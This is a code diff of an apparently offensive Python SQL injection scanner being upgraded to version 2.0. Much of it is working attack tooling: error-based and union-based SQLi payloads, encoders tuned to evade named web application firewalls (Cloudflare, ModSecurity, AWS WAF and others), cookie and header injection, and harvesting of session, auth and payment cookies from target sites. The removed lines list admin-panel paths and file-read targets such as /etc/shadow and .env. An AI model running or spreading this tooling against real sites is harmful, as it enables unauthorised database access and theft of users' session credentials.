@@ -1,13 +1,19 @@
 """
-SQL Injection Scanner — Error-based + Union-based detection
+SQL Injection Scanner v2.0 — Full-spectrum injection testing
 
-Tests URLs for SQL injection vulnerabilities using:
+Features:
 1. Error-based detection (FLOOR/RAND/GROUP BY for MySQL, equivalent for others)
 2. Union-based detection (ORDER BY column counting + UNION SELECT)
 3. Boolean-based blind detection (AND 1=1 vs AND 1=2 response diff)
 4. Time-based blind detection (SLEEP/WAITFOR/pg_sleep)
+5. Cookie injection testing — extracts & tests all cookies
+6. Header injection testing — X-Forwarded-For, Referer, User-Agent, custom
+7. POST parameter discovery — parses <form> tags, hidden inputs
+8. Smart parameter prioritization — id/cat/pid first, lang/theme last
+9. WAF-specific bypass payloads — tailored encodings per detected WAF
+10. Technology-based payload selection — detects PHP/ASP/JSP → picks DBMS payloads
 
-Supports: MySQL, MSSQL, PostgreSQL, Oracle
+Supports: MySQL, MSSQL, PostgreSQL, Oracle, SQLite
 """
 
 import re
@@ -15,9 +21,11 @@ import asyncio
 import aiohttp
 import random
 import time
-from typing import Dict, List, Optional, Tuple
+import hashlib
+from typing import Dict, List, Optional, Tuple, Any
 from dataclasses import dataclass, field
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
+from bs4 import BeautifulSoup
 from loguru import logger
 
 
@@ -27,7 +35,7 @@ class SQLiResult:
     url: str
     parameter: str
     vulnerable: bool = False
-    injection_type: str = ""  # error, union, boolean, time
+    injection_type: str = ""  # error, union, boolean, time, cookie, header
     dbms: str = ""  # mysql, mssql, postgresql, oracle
     technique: str = ""
     column_count: int = 0
@@ -38,10 +46,39 @@ class SQLiResult:
     error_message: str = ""
     payload_used: str = ""
     confidence: float = 0.0  # 0.0 - 1.0
+    injection_point: str = "url"  # url, cookie, header, post
+    cookies_extracted: Dict[str, str] = field(default_factory=dict)
+
+
+@dataclass 
+class CookieJar:
+    """Collected cookies from a target site."""
+    url: str
+    cookies: Dict[str, str] = field(default_factory=dict)
+    session_cookies: List[str] = field(default_factory=list)
+    auth_cookies: List[str] = field(default_factory=list)
+    tracking_cookies: List[str] = field(default_factory=list)
+    all_set_cookie_headers: List[str] = field(default_factory=list)
+    b3_cookies: Dict[str, str] = field(default_factory=dict)  # b3 tracing cookies
+
+
+# Session/auth cookie name patterns for b3 extraction
+SESSION_COOKIE_PATTERNS = [
+    re.compile(r"(PHPSESSID|JSESSIONID|ASP\.NET_SessionId|session|sess_id|sid|token|auth|jwt|access_token|refresh_token)", re.I),
+    re.compile(r"(wp_|wordpress_|wc_session|checkout)", re.I),
+    re.compile(r"(csrf|xsrf|_token|anti.?forgery)", re.I),
+    re.compile(r"(b3|x-b3|traceid|spanid|parentspanid|sampled|flags)", re.I),
+    re.compile(r"(connect\.sid|express\.sid|rack\.session|_session_id)", re.I),
+    re.compile(r"(remember|persistent|stay_logged|keep_alive)", re.I),
+    re.compile(r"(cart|basket|order|checkout|payment)", re.I),
+]
+
+# B3 tracing header/cookie names
+B3_NAMES = {"x-b3-traceid", "x-b3-spanid", "x-b3-parentspanid", "x-b3-sampled", "x-b3-flags", "b3"}
 
 
 class SQLiScanner:
-    """SQL injection vulnerability scanner."""
+    """SQL injection vulnerability scanner with cookie/header/POST injection."""
 
     # DBMS error signatures
     DBMS_ERRORS = {
@@ -179,222 +216,124 @@ class SQLiScanner:
         ],
     }
     
-    # WAF evasion encodings (from SQLi Dumper v8.5)
+    # WAF evasion encodings
     EVASION_TECHNIQUES = {
         "comment": lambda p: p.replace(" ", "/**/"),
         "double_url": lambda p: p.replace("'", "%2527"),
         "mixed_case": lambda p: re.sub(r'(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP|TABLE|CONCAT|GROUP|HAVING|ORDER|BY|INTO)', 
                                         lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())), p, flags=re.I),
         "inline_comment": lambda p: p.replace("UNION", "UN/*!50000ION*/").replace("SELECT", "SE/*!50000LECT*/"),
-        "url_encoded_comment": lambda p: p.replace(" ", "%2f**%2f"),  # /**/ URL encoded
     }
-    
-    # WAF Bypass Union Payloads (from SQLi Dumper v8.5)
-    WAF_BYPASS_UNION_PAYLOADS = [
-        # Standard variants
-        "999999.9 uNiOn aLl sElEcT {cols}-- -",
-        "-1 uNiOn aLl sElEcT {cols}-- -",
-        "999999.9' uNiOn aLl sElEcT {cols} aNd '0'='0",
-        "-1' uNiOn aLl sElEcT {cols} aNd '1'='1",
-        "999999.9\" uNiOn aLl sElEcT {cols} aNd \"0\"=\"0",
-        # Inline comment obfuscation (WAF bypass)
-        "999999.9/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
-        "-1/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
-        "999999.9'/**/uNiOn/**/aLl/**/sElEcT/**/{cols}/**/aNd/**/'0'='0",
-        "-1'/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
-        # URL encoded comment bypass
-        "999999.9%2f**%2fuNiOn%2f**%2faLl%2f**%2fsElEcT%2f**%2f{cols}-- -",
-        "-1%2f**%2fuNiOn%2f**%2faLl%2f**%2fsElEcT%2f**%2f{cols}-- -",
-        # Mixed techniques
-        "0x0/**/UniOn/**/aLl/**/SeLeCt/**/{cols}-- -",
-        "null/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
-        "(null)/**/uNiOn/**/aLl/**/sElEcT/**/{cols}-- -",
-        # Parenthesis bypass
-        "999999.9)/**/uNiOn/**/aLl/**/sElEcT/**/{cols}/**/and/**/(1=1",
-        "-1)/**/uNiOn/**/aLl/**/sElEcT/**/{cols}/**/and/**/(1=1",
-        # Double dash variations
-        "999999.9'/**/uNiOn/**/aLl/**/sElEcT/**/{cols}#",
-        "-1'/**/uNiOn/**/aLl/**/sElEcT/**/{cols};--",
-        # Concat versions for data extraction
-        "999999.9'/**/uNiOn/**/aLl/**/sElEcT/**/{cols_concat}-- -",
-    ]
-    
-    # WAF Bypass Error-based Payloads
-    WAF_BYPASS_ERROR_PAYLOADS = {
-        "mysql": [
-            # FLOOR/RAND with obfuscation
-            "'/**/aNd/**/(sElEcT/**/1/**/fRoM/**/(sElEcT/**/cOuNt(*),cOnCaT((sElEcT/**/vErSiOn()),fLoOr(rAnD(0)*2))x/**/fRoM/**/iNfOrMaTiOn_sChEmA.tAbLeS/**/gRoUp/**/bY/**/x)a)-- -",
-            "'%2f**%2faNd%2f**%2f(sElEcT%2f**%2f1%2f**%2ffRoM%2f**%2f(sElEcT%2f**%2fcOuNt(*),cOnCaT((sElEcT%2f**%2fdAtAbAsE()),fLoOr(rAnD(0)*2))x%2f**%2ffRoM%2f**%2fiNfOrMaTiOn_sChEmA.tAbLeS%2f**%2fgRoUp%2f**%2fbY%2f**%2fx)a)-- -",
-            # EXTRACTVALUE with obfuscation
-            "'/**/aNd/**/eXtRaCtVaLuE(1,cOnCaT(0x7e,(sElEcT/**/vErSiOn()),0x7e))-- -",
-            "'/**/aNd/**/eXtRaCtVaLuE(1,cOnCaT(0x7e,(sElEcT/**/dAtAbAsE()),0x7e))-- -",
-            # UPDATEXML with obfuscation  
-            "'/**/aNd/**/uPdAtExMl(1,cOnCaT(0x7e,(sElEcT/**/@@vErSiOn),0x7e),1)-- -",
-            "'/**/aNd/**/uPdAtExMl(1,cOnCaT(0x7e,(sElEcT/**/uSeR()),0x7e),1)-- -",
-        ],
-        "mssql": [
-            "'/**/aNd/**/1=cOnVeRt(iNt,(sElEcT/**/@@vErSiOn))-- -",
-            "'/**/aNd/**/1=cOnVeRt(iNt,(sElEcT/**/dB_nAmE()))-- -",
-            "'/**/aNd/**/1=cOnVeRt(iNt,(sElEcT/**/sYsTeM_uSeR))-- -",
-        ],
-        "postgresql": [
-            "'/**/aNd/**/1=cAsT((sElEcT/**/vErSiOn())/**/aS/**/iNt)-- -",
-            "'/**/aNd/**/1=cAsT((sElEcT/**/cUrReNt_dAtAbAsE())/**/aS/**/iNt)-- -",
-        ],
+
+    # ── Smart parameter prioritization ──
+    PARAM_PRIORITY = {
+        # High-value (likely DB-backed): score 10
+        "id": 10, "item_id": 10, "product_id": 10, "cat_id": 10,
+        "category_id": 10, "user_id": 10, "order_id": 10, "page_id": 10,
+        "post_id": 10, "article_id": 10, "news_id": 10, "doc_id": 10,
+        "pid": 9, "uid": 9, "cid": 9, "nid": 9, "aid": 9,
+        "cat": 9, "item": 9, "product": 9, "catid": 9,
+        # Medium-value: score 6
+        "search": 6, "q": 6, "query": 6, "keyword": 6, "s": 6,
+        "action": 6, "do": 6, "cmd": 6, "page": 6,
+        "name": 6, "username": 6, "user": 6, "email": 6,
+        "file": 5, "path": 5, "url": 5, "redirect": 5,
+        "type": 5, "view": 5, "show": 5, "display": 5,
+        # Low-value (rarely injectable): score 2
+        "lang": 2, "language": 2, "locale": 2, "theme": 2,
+        "template": 2, "style": 2, "color": 2, "size": 2,
+        "sort": 2, "order": 2, "dir": 2, "limit": 2,
+        "offset": 2, "per_page": 2, "format": 2, "callback": 2,
+        "utm_source": 1, "utm_medium": 1, "utm_campaign": 1,
+        "ref": 1, "source": 1, "fbclid": 1, "gclid": 1,
     }
-    
-    # Admin Panel Paths (from SQLi Dumper dictionary - 297 paths with dynamic extensions)
-    ADMIN_PATHS = [
-        # Core admin paths
-        "admin/", "administrator/", "admin.php", "admin.html", "admin.asp", "admin.aspx", "admin.htm",
-        "login/", "login.php", "login.html", "login.asp", "login.aspx", "login.htm",
-        "admin/login.php", "admin/login.html", "admin/login.htm", "admin/admin-login.php",
-        "admin/admin.php", "admin/index.php", "admin/home.php", "admin/account.html", "admin/account.php",
-        "admin/controlpanel.php", "admin/controlpanel.html", "admin/controlpanel.htm",
-        "admin/cp.php", "admin/adminLogin.php", "admin/adminLogin.html", "admin/admin_login.php",
-        "administrator/login.php", "administrator/index.php", "administrator/account.php",
-        "administration/", "administration.php",
-        "admin_area/", "admin_area/admin.php", "admin_area/login.php", "admin_area/index.php",
-        "admincp/", "admincp/index.php", "admincp/login.php",
-        "adminitem/", "adminitem.php", "adminitems/", "adminitems.php",
-        # Extended paths from SQLi Dumper
-        "adm/", "adm.php", "adm/index.php", "adminLogin/", "adminlogin.php",
-        "cp/", "cpanel/", "controlpanel/", "controlpanel.php", "control/", "control.php",
-        "manage/", "manage.php", "management/", "management.php", "manager/", "manager.php",
-        "superuser/", "superuser.php", "supervisor/", "sysadm/", "sysadm.php", "sysadmin/",
-        "panel/", "panel.php", "uvpanel/",
-        "member/", "member.php", "members/", "members.php",
-        "user/", "user.php", "users/", "users.php",
-        "account/", "accounts/", "accounts.php",
-        "signin/", "signin.php", "sign-in/", "sign-in.php", "sign_in/", "sign_in.php",
-        "log-in/", "log-in.php", "log_in/", "log_in.php",
-        "relogin/", "relogin.php", "relogin.htm", "relogin.html",
-        # CMS specific
-        "wp-admin/", "wp-login.php", "blog/wp-login.php",
-        "bb-admin/", "bb-admin/login.php", "bb-admin/admin.php", "bb-admin/admin.html",
-        "joomla/administrator/", "administrator/index.php",
-        "typo3/", "drupal/admin/", "bitrix/admin/", "modx/manager/",
-        "magento/admin/", "magento/index.php/admin/",
-        # Check functions
-        "check.php", "checklogin.php", "checkuser.php", "checkadmin.php", "isadmin.php",
-        "authenticate.php", "authentication.php", "auth.php", "auth/",
-        "processlogin.php", "dologin.php",
-        # User admin
-        "user/admin.php", "users/admin.php", "member/login.php", "member/admin.php",
-        "registration/", "usercp/", "useradmin/", "customer/", "customer/login/",
-        # Backend/Dashboard
-        "backend/", "backend/login.php", "backend/admin.php", "dashboard/", "dashboard.php",
-        "cms/", "cms/admin/", "system/", "system/admin/",
-        "secure/", "secure/admin/", "private/", "private/admin/",
-        # Database admin
-        "phpmyadmin/", "pma/", "myadmin/", "mysql/", "dbadmin/", "db/", "sql/", "database/",
-        # Letmein/access paths
-        "letmein/", "letmein.php", "access/", "access.php", "superman/",
-        # Numbered admin
-        "admin1/", "admin2/", "admin3/", "admin4/", "admin5/",
-        # More paths
-        "site/admin/", "portal/admin/", "app/admin/", "webadmin/", "adminsite/",
-        "admin/dashboard/", "admin/panel/", "admin/cp/", "modcp/", "moderator/",
-        # ASP specific
-        "admin/admin.asp", "admin/login.asp", "admin/index.asp",
-        "administrator/admin.asp", "administrator/login.asp",
-        "admin/adminLogin.asp", "admin_area/admin.asp", "admin_area/login.asp",
-    ]
-    
-    # LFI/File Read Paths (from SQLi Dumper dic_file_dump.txt - 206 paths)
-    LFI_PATHS = [
-        # System files
-        "/etc/passwd", "/etc/shadow", "/etc/group",
-        "/etc/security/group", "/etc/security/passwd", "/etc/security/user",
-        "/etc/security/environ", "/etc/security/limits",
-        "/usr/lib/security/mkuser.default",
-        # Apache logs
-        "/apache/logs/access.log", "/apache/logs/error.log",
-        "/etc/httpd/logs/access_log", "/etc/httpd/logs/access.log",
-        "/etc/httpd/logs/error_log", "/etc/httpd/logs/error.log",
-        "/var/www/logs/access_log", "/var/www/logs/access.log",
-        "/var/www/logs/error_log", "/var/www/logs/error.log",
-        "/usr/local/apache/logs/access_log", "/usr/local/apache/logs/access.log",
-        "/usr/local/apache/logs/error_log", "/usr/local/apache/logs/error.log",
-        "/var/log/apache/access_log", "/var/log/apache/access.log",
-        "/var/log/apache2/access_log", "/var/log/apache2/access.log",
-        "/var/log/apache/error_log", "/var/log/apache/error.log",
-        "/var/log/apache2/error_log", "/var/log/apache2/error.log",
-        "/var/log/access_log", "/var/log/access.log",
-        "/var/log/error_log", "/var/log/error.log",
-        "/var/log/httpd/access_log", "/var/log/httpd/access.log",
-        "/var/log/httpd/error_log", "/var/log/httpd/error.log",
-        "/apache2/logs/error.log", "/apache2/logs/access.log",
-        "/logs/error.log", "/logs/access.log",
-        "/usr/local/apache2/logs/access_log", "/usr/local/apache2/logs/access.log",
-        "/usr/local/apache2/logs/error_log", "/usr/local/apache2/logs/error.log",
-        "/opt/lampp/logs/access_log", "/opt/lampp/logs/error_log",
-        "/opt/xampp/logs/access_log", "/opt/xampp/logs/error_log",
-        "/opt/lampp/logs/access.log", "/opt/lampp/logs/error.log",
-        "/opt/xampp/logs/access.log", "/opt/xampp/logs/error.log",
-        # Apache config
-        "/usr/local/apache/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf",
-        "/etc/httpd/conf/httpd.conf", "/etc/apache/conf/httpd.conf",
-        "/etc/apache2/httpd.conf", "/usr/local/apache/httpd.conf",
-        "/usr/local/apache2/httpd.conf", "/usr/local/httpd/conf/httpd.conf",
-        "/etc/apache2/conf/httpd.conf", "/etc/httpd/httpd.conf",
-        "/etc/httpd.conf", "/opt/apache/conf/httpd.conf", "/opt/apache2/conf/httpd.conf",
-        "/var/www/conf/httpd.conf", "/private/etc/httpd/httpd.conf",
-        # PHP config
-        "/etc/php.ini", "/bin/php.ini", "/etc/httpd/php.ini",
-        "/usr/lib/php.ini", "/usr/lib/php/php.ini",
-        "/usr/local/etc/php.ini", "/usr/local/lib/php.ini",
-        "/usr/local/php/lib/php.ini", "/usr/local/php4/lib/php.ini", "/usr/local/php5/lib/php.ini",
-        "/usr/local/apache/conf/php.ini",
-        "/etc/php4/apache/php.ini", "/etc/php4/apache2/php.ini",
-        "/etc/php5/apache/php.ini", "/etc/php5/apache2/php.ini",
-        "/etc/php/php.ini", "/etc/php/apache/php.ini", "/etc/php/apache2/php.ini",
-        "/web/conf/php.ini", "/usr/local/Zend/etc/php.ini",
-        "/opt/xampp/etc/php.ini", "/var/local/www/conf/php.ini",
-        "/etc/php/cgi/php.ini", "/etc/php4/cgi/php.ini", "/etc/php5/cgi/php.ini",
-        # cPanel
-        "/usr/local/cpanel/logs", "/usr/local/cpanel/logs/stats_log",
-        "/usr/local/cpanel/logs/access_log", "/usr/local/cpanel/logs/error_log",
-        "/usr/local/cpanel/logs/license_log", "/usr/local/cpanel/logs/login_log",
-        "/var/cpanel/cpanel.config",
-        # MySQL
-        "/var/log/mysql/mysql-bin.log", "/var/log/mysql.log",
-        "/var/log/mysqlderror.log", "/var/log/mysql/mysql.log",
-        "/var/log/mysql/mysql-slow.log", "/var/mysql.log",
-        "/var/lib/mysql/my.cnf", "/etc/mysql/my.cnf", "/etc/my.cnf",
-        # FTP configs/logs
-        "/etc/logrotate.d/proftpd", "/www/logs/proftpd.system.log",
-        "/var/log/proftpd", "/etc/proftp.conf", "/etc/proftpd/proftpd.conf",
-        "/etc/vhcs2/proftpd/proftpd.conf", "/etc/proftpd/modules.conf",
-        "/var/log/vsftpd.log", "/etc/vsftpd.chroot_list",
-        "/etc/logrotate.d/vsftpd.log", "/etc/vsftpd/vsftpd.conf", "/etc/vsftpd.conf",
-        "/etc/chrootUsers", "/var/log/xferlog", "/var/adm/log/xferlog",
-        "/etc/wu-ftpd/ftpaccess", "/etc/wu-ftpd/ftphosts", "/etc/wu-ftpd/ftpusers",
-        # Pure-FTPd
-        "/usr/sbin/pure-config.pl", "/usr/etc/pure-ftpd.conf",
-        "/etc/pure-ftpd/pure-ftpd.conf", "/usr/local/etc/pure-ftpd.conf",
-        "/usr/local/etc/pureftpd.pdb", "/usr/local/pureftpd/etc/pureftpd.pdb",
-        "/etc/pure-ftpd.conf", "/etc/pure-ftpd/pure-ftpd.pdb",
-        "/etc/pureftpd.pdb", "/etc/pureftpd.passwd",
-        "/var/log/pure-ftpd/pure-ftpd.log", "/logs/pure-ftpd.log",
-        "/var/log/pureftpd.log", "/var/log/ftp-proxy/ftp-proxy.log",
-        "/var/log/ftplog", "/etc/ftpchroot", "/etc/ftphosts",
-        # Mail logs
-        "/var/log/exim_mainlog", "/var/log/exim/mainlog", "/var/log/maillog",
-        "/var/log/exim_paniclog", "/var/log/exim/paniclog", "/var/log/exim/rejectlog",
-        # Proc filesystem (Linux)
-        "/proc/self/environ", "/proc/self/cmdline", "/proc/self/fd/0",
-        "/proc/self/fd/1", "/proc/self/fd/2",
-        "/proc/version", "/proc/cpuinfo", "/proc/meminfo",
-        # Web app configs
-        "wp-config.php", "../wp-config.php", "../../wp-config.php",
-        "config.php", "../config.php", "../../config.php",
-        "configuration.php", "../configuration.php",
-        "settings.php", "../settings.php", "../../settings.php",
-        "config.inc.php", "../config.inc.php",
-        "db.php", "../db.php", "database.php", "../database.php",
-        ".env", "../.env", "../../.env",
-        ".htaccess", "../.htaccess",
+
+    # ── WAF-specific bypass payload generators ──
+    WAF_BYPASS_PAYLOADS = {
+        "Cloudflare": {
+            "encodings": [
+                lambda p: p.replace("UNION", "UNI%0AON").replace("SELECT", "SEL%0AECT"),
+                lambda p: p.replace(" ", "%09"),  # Tab instead of space
+                lambda p: p.replace("'", "%EF%BC%87"),  # Fullwidth apostrophe
+                lambda p: re.sub(r'UNION\s+SELECT', 'UNION%23%0ASELECT', p, flags=re.I),
+            ],
+            "techniques": ["time", "boolean"],  # Prefer blind techniques
+        },
+        "ModSecurity": {
+            "encodings": [
+                lambda p: p.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/"),
+                lambda p: p.replace(" ", "/**/"),
+                lambda p: re.sub(r'(AND|OR)', lambda m: f'/*!{m.group()}*/', p, flags=re.I),
+                lambda p: p.replace("'", "' "),  # Space after quote
+            ],
+            "techniques": ["error", "union", "time"],
+        },
+        "Wordfence": {
+            "encodings": [
+                lambda p: p.replace("UNION SELECT", "UNION%23%0ASELECT"),
+                lambda p: p.replace(" ", "/**_**/"),
+                lambda p: p.replace("AND", "&&").replace("OR", "||"),
+            ],
+            "techniques": ["time", "boolean"],
+        },
+        "Sucuri": {
+            "encodings": [
+                lambda p: p.replace("UNION", "UNI%0BON").replace("SELECT", "SE%0BLECT"),
+                lambda p: p.replace("'", "%27%27")[:-3],
+                lambda p: p.replace(" ", chr(0x0a)),
+            ],
+            "techniques": ["time", "error"],
+        },
+        "F5 BIG-IP ASM": {
+            "encodings": [
+                lambda p: p.replace("'", "%c0%a7"),  # Overlong UTF-8
+                lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),
+            ],
+            "techniques": ["time"],  # Only blind works
+        },
+        "AWS WAF": {
+            "encodings": [
+                lambda p: p.replace("UNION", "UNION%23%0a").replace("SELECT", "SELECT%23%0a"),
+                lambda p: p.replace(" ", "%0c"),  # Form feed
+            ],
+            "techniques": ["time", "boolean"],
+        },
+    }
+
+    # ── Technology → likely DBMS mapping ──
+    TECH_DBMS_MAP = {
+        "php": ["mysql", "postgresql", "sqlite"],
+        "asp": ["mssql"],
+        "asp.net": ["mssql"],
+        "aspx": ["mssql"],
+        "jsp": ["oracle", "mysql", "postgresql"],
+        "java": ["oracle", "mysql", "postgresql"],
+        "python": ["postgresql", "mysql", "sqlite"],
+        "ruby": ["postgresql", "mysql", "sqlite"],
+        "node": ["mysql", "postgresql", "mongodb"],
+        "wordpress": ["mysql"],
+        "drupal": ["mysql", "postgresql"],
+        "joomla": ["mysql"],
+        "magento": ["mysql"],
+        "woocommerce": ["mysql"],
+        "shopify": [],  # SaaS, no SQLi
+        "django": ["postgresql", "mysql", "sqlite"],
+        "laravel": ["mysql", "postgresql"],
+        "rails": ["postgresql", "mysql", "sqlite"],
+    }
+
+    # ── Header injection targets ──
+    INJECTABLE_HEADERS = [
+        "X-Forwarded-For",
+        "X-Forwarded-Host",
+        "X-Client-IP",
+        "X-Real-IP",
+        "Referer",
+        "X-Custom-IP-Authorization",
+        "X-Originating-IP",
+        "CF-Connecting-IP",
+        "True-Client-IP",
+        "Client-IP",
     ]
 
     def __init__(self, timeout: int = 15, max_concurrent: int = 10, 
@@ -410,6 +349,10 @@ class SQLiScanner:
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         ])
         self.semaphore = asyncio.Semaphore(max_concurrent)
+        # Collected cookies & headers from scanned targets
+        self.collected_cookies: List[CookieJar] = []
+
+    # ══════════════════════════ UTILITY METHODS ══════════════════════════
 
     def _parse_url(self, url: str) -> Tuple[str, Dict[str, List[str]]]:
         """Parse URL and extract base URL + parameters."""
@@ -423,6 +366,444 @@ class SQLiScanner:
         flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
         query = urlencode(flat)
         return f"{base}?{query}" if query else base
+
+    def _prioritize_params(self, params: Dict[str, List[str]]) -> List[str]:
+        """Sort parameters by injection likelihood — id/cat/pid first, utm/ref last."""
+        scored = []
+        for name in params:
+            name_lower = name.lower()
+            # Check exact match first
+            score = self.PARAM_PRIORITY.get(name_lower, 4)
+            # Pattern-based scoring
+            if re.match(r'.*_?id$', name_lower):
+                score = max(score, 9)
+            elif re.match(r'.*_?(num|no|number|code)$', name_lower):
+                score = max(score, 7)
+            scored.append((name, score))
+        scored.sort(key=lambda x: x[1], reverse=True)
+        return [name for name, _ in scored]
+
+    def _detect_technology(self, url: str, headers: Dict = None, body: str = "") -> List[str]:
+        """Detect backend technology from URL extension, headers, body."""
+        techs = []
+        parsed = urlparse(url)
+        path_lower = parsed.path.lower()
+        
+        # URL extension
+        if path_lower.endswith('.php'):
+            techs.append("php")
+        elif path_lower.endswith(('.asp', '.aspx')):
+            techs.append("asp.net")
+        elif path_lower.endswith('.jsp'):
+            techs.append("jsp")
+        elif path_lower.endswith(('.py', '.cgi')):
+            techs.append("python")
+        elif path_lower.endswith('.rb'):
+            techs.append("ruby")
+        
+        if headers:
+            powered_by = headers.get("X-Powered-By", headers.get("x-powered-by", "")).lower()
+            server = headers.get("Server", headers.get("server", "")).lower()
+            if "php" in powered_by:
+                techs.append("php")
+            elif "asp.net" in powered_by:
+                techs.append("asp.net")
+            elif "express" in powered_by or "node" in server:
+                techs.append("node")
+            if "apache" in server and "php" not in techs:
+                techs.append("php")  # Apache often means PHP
+        
+        if body:
+            if re.search(r'wp-content|wordpress', body, re.I):
+                techs.append("wordpress")
+            elif re.search(r'drupal', body, re.I):
+                techs.append("drupal")
+            elif re.search(r'joomla', body, re.I):
+                techs.append("joomla")
+            elif re.search(r'woocommerce|wc-ajax', body, re.I):
+                techs.append("woocommerce")
+                techs.append("wordpress")
+            elif re.search(r'laravel|csrf-token.*content', body, re.I):
+                techs.append("laravel")
+                techs.append("php")
+        
+        return list(set(techs))
+
+    def _get_likely_dbms(self, techs: List[str]) -> List[str]:
+        """Get likely DBMS list based on detected technologies."""
+        dbms_set = []
+        for tech in techs:
+            for db in self.TECH_DBMS_MAP.get(tech, []):
+                if db not in dbms_set:
+                    dbms_set.append(db)
+        if not dbms_set:
+            dbms_set = ["mysql", "mssql", "postgresql"]  # Default order
+        return dbms_set
+
+    def _apply_waf_bypass(self, payload: str, waf_name: str) -> List[str]:
+        """Generate WAF-bypass variations of a payload for a specific WAF."""
+        encoded = [payload]  # Always include original
+        waf_info = self.WAF_BYPASS_PAYLOADS.get(waf_name, {})
+        for encoder in waf_info.get("encodings", []):
+            try:
+                encoded.append(encoder(payload))
+            except Exception:
+                pass
+        # Always add generic evasions too
+        for name, func in self.EVASION_TECHNIQUES.items():
+            try:
+                encoded.append(func(payload))
+            except Exception:
+                pass
+        return list(set(encoded))
+
+    # ══════════════════════════ COOKIE EXTRACTION ══════════════════════════
+
+    async def extract_cookies(self, url: str, session: aiohttp.ClientSession) -> CookieJar:
+        """Extract ALL cookies from a URL — session, auth, b3, tracking.
+        
+        Makes initial GET request, follows redirects, collects:
+        - Response Set-Cookie headers
+        - Session cookies (PHPSESSID, JSESSIONID, etc.)
+        - Auth cookies (token, jwt, auth, remember)
+        - B3 tracing cookies/headers
+        - Commerce cookies (cart, checkout, payment)
+        """
+        jar = CookieJar(url=url)
+        
+        try:
+            async with self.semaphore:
+                # Create a cookie jar to capture all cookies
+                cookie_jar = aiohttp.CookieJar(unsafe=True)
+                async with aiohttp.ClientSession(
+                    timeout=aiohttp.ClientTimeout(total=self.timeout),
+                    cookie_jar=cookie_jar,
+                    headers={"User-Agent": self.user_agent}
+                ) as cookie_session:
+                    async with cookie_session.get(url, allow_redirects=True, ssl=False) as resp:
+                        # Collect Set-Cookie headers
+                        for header in resp.headers.getall("Set-Cookie", []):
+                            jar.all_set_cookie_headers.append(header)
+                        
+                        # Collect response cookies
+                        for name, cookie in resp.cookies.items():
+                            jar.cookies[name] = cookie.value
+                        
+                        # Also get from the cookie jar (includes redirect cookies)
+                        for cookie in cookie_jar:
+                            jar.cookies[cookie.key] = cookie.value
+                        
+                        # Collect B3 tracing from response headers
+                        for header_name in resp.headers:
+                            if header_name.lower() in B3_NAMES or header_name.lower().startswith("x-b3"):
+                                jar.b3_cookies[header_name] = resp.headers[header_name]
+                        
+                        # Categorize cookies
+                        for name, value in jar.cookies.items():
+                            name_lower = name.lower()
+                            
+                            # B3 cookies
+                            if any(b3 in name_lower for b3 in ["b3", "trace", "span", "sampled"]):
+                                jar.b3_cookies[name] = value
+                            
+                            # Session cookies
+                            if any(p.search(name) for p in SESSION_COOKIE_PATTERNS[:3]):
+                                jar.session_cookies.append(f"{name}={value}")
+                            
+                            # Auth cookies
+                            if re.search(r"auth|token|jwt|access|login|remember|persist", name_lower):
+                                jar.auth_cookies.append(f"{name}={value}")
+                            
+                            # Tracking cookies
+                            if re.search(r"utm|_ga|_gid|fbp|_fbc|analytics|track", name_lower):
+                                jar.tracking_cookies.append(f"{name}={value}")
+        
+        except Exception as e:
+            logger.debug(f"Cookie extraction error for {url}: {e}")
+        
+        if jar.cookies:
+            logger.info(f"Extracted {len(jar.cookies)} cookies from {url} "
+                        f"(session={len(jar.session_cookies)}, auth={len(jar.auth_cookies)}, "
+                        f"b3={len(jar.b3_cookies)})")
+            self.collected_cookies.append(jar)
+        
+        return jar
+
+    # ══════════════════════════ COOKIE INJECTION TESTING ══════════════════════════
+
+    async def test_cookie_injection(self, url: str, session: aiohttp.ClientSession,
+                                     waf_name: str = None) -> List[SQLiResult]:
+        """Inject SQLi payloads into cookie values to find vulnerabilities.
+        
+        Tests each cookie by injecting payloads and checking for DBMS errors.
+        Also extracts fresh cookies for b3 collection.
+        """
+        results = []
+        
+        # First extract cookies
+        jar = await self.extract_cookies(url, session)
+        if not jar.cookies:
+            return results
+        
+        injection_payloads = [
+            "'",
+            "' OR '1'='1",
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -",
+            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+            "1 OR 1=1",
+            "' UNION SELECT NULL-- -",
+        ]
+        
+        for cookie_name, cookie_value in jar.cookies.items():
+            # Skip tracking/analytics cookies (rarely backed by DB queries)
+            if re.search(r"utm|_ga|_gid|fbp|analytics|track|gdpr|consent", cookie_name.lower()):
+                continue
+            
+            for payload in injection_payloads:
+                try:
+                    # Build cookies dict with injected value
+                    test_cookies = jar.cookies.copy()
+                    test_cookies[cookie_name] = payload
+                    
+                    # Apply WAF bypass if known
+                    if waf_name:
+                        bypass_payloads = self._apply_waf_bypass(payload, waf_name)
+                        test_cookies[cookie_name] = bypass_payloads[0]
+                    
+                    cookie_header = "; ".join(f"{k}={v}" for k, v in test_cookies.items())
+                    headers = {
+                        "User-Agent": self.user_agent,
+                        "Cookie": cookie_header,
+                    }
+                    
+                    async with self.semaphore:
+                        async with session.get(url, headers=headers, allow_redirects=True,
+                                               ssl=False, proxy=self.proxy) as resp:
+                            body = await resp.text(errors="ignore")
+                    
+                    dbms = self._detect_dbms(body)
+                    if dbms:
+                        extracted = self._extract_error_data(body)
+                        result = SQLiResult(
+                            url=url,
+                            parameter=f"Cookie:{cookie_name}",
+                            vulnerable=True,
+                            injection_type="cookie",
+                            dbms=dbms,
+                            technique="Cookie injection",
